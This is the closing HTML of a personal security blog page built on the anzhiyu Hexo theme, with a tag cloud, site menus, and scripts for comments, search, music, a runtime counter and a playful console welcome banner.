href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" style="font-size: 0.88rem;">中间件<sup>15</sup></a><a href="/tags/%E4%BA%91%E5%AD%98%E5%82%A8/" style="font-size: 0.88rem;">云存储<sup>1</sup></a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">云安全<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>15</sup></a><a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">反序列化<sup>4</sup></a><a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">域渗透测试<sup>2</sup></a><a href="/tags/%E5%AE%9E%E9%AA%8C/" style="font-size: 0.88rem;">实验<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size: 0.88rem;">密码<sup>8</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 0.88rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 0.88rem;">权限提升<sup>2</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 0.88rem;">横向移动<sup>4</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>22</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 0.88rem;">漏洞复现<sup>22</sup></a><a href="/tags/%E7%A1%AC%E7%9B%98/" style="font-size: 0.88rem;">硬盘<sup>1</sup></a><a href="/tags/%E7%A7%81%E6%9C%89%E4%BA%91/" style="font-size: 0.88rem;">私有云<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 0.88rem;">网络协议<sup>2</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">网络安全<sup>10</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">网络配置<sup>1</sup></a><a href="/tags/%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/" style="font-size: 0.88rem;">认证机制<sup>3</sup></a><a href="/tags/%E8%AF%81%E4%B9%A6/" style="font-size: 0.88rem;">证书<sup>1</sup></a><a href="/tags/%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/" style="font-size: 0.88rem;">限制绕过<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">靶场<sup>3</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8923547078" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/#/playlist?id=8923547078&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/cdn/lib/js/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("12/01/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎来到My Blog!`,
    `生活明朗, 万物可爱`,
    `
    ████████╗ █████╗ ██╗  ██╗ █████╗ ██╗  ██╗███████╗
    ╚══██╔══╝██╔══██╗██║ ██╔╝██╔══██╗██║ ██╔╝██╔════╝
       ██║   ███████║█████╔╝ ███████║█████╔╝ █████╗  
       ██║   ██╔══██║██╔═██╗ ██╔══██║██╔═██╗ ██╔══╝  
       ██║   ██║  ██║██║  ██╗██║  ██║██║  ██╗███████╗
       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        `,
    "已上线",
    dnum,
    "天",
    "©2022 By Takake V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【骇客】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Takake 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script async="async">(function () {
  var grt = new Date("12/01/2023 00:00:00"); //设置网站上线时间
  var now = new Date();
  var dnum;
  var hnum;
  var mnum;
  var snum;
  var nowHour;

  // 计算并更新天数、小时数、分钟数和秒数
  function updateTime() {
    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
        img.title = "下班玩人工智能，嘿嘿~";
        img.alt = "下班玩人工智能，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "vister@takake.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
  const isChatBtn = false
  const isChatHideShow = false

  if (isChatBtn) {
    const close = () => {
      Chatra('minimizeWidget')
      Chatra('hide')
    }

    const open = () => {
      Chatra('openChat', true)
      Chatra('show')
    }

    window.ChatraSetup = {
      startHidden: true
    }
  
    window.chatBtnFn = () => {
      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
      isShow ? close() : open()
    }
  } else if (isChatHideShow) {
    window.chatBtn = {
      hide: () => {
        Chatra('hide')
      },
      show: () => {
        Chatra('show')
      }
    }
  }

  (function(d, w, c) {
    w.ChatraID = 'MYtmap9meYHQGdDTJ'
    var s = d.createElement('script')
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments)
    }
    s.async = true
    s.src = 'https://call.chatra.io/chatra.js'
    if (d.head) d.head.appendChild(s)
  })(document, window, 'Chatra')

})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>